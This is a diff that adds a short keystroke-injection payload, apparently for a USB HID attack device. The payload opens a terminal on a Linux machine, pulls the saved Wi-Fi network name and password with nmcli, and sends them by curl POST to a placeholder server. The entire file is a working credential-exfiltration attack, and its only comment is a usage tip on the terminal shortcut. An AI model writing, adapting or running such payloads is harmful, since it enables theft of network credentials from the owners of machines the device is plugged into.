@@ -1,0 +1,18 @@
+REM ctrl alt t has to be the shortcut for opening terminal, change it if it doesn't work for you
+CTRL ALT T
+DELAY 1000
+
+STRING ssid=$(nmcli device wifi show-password | grep SSID | cut -d : -f 2 | xargs)
+ENTER
+STRING password=$(nmcli device wifi show-password | grep Password | cut -d : -f 2 | xargs)
+ENTER
+STRING if [ ! -z "$password" ]
+ENTER
+STRING then
+ENTER
+STRING curl -X POST -F "data=ssid:$ssid password:$password" http://<email-server>/email
+ENTER
+STRING fi
+ENTER
+STRING exit
+ENTER
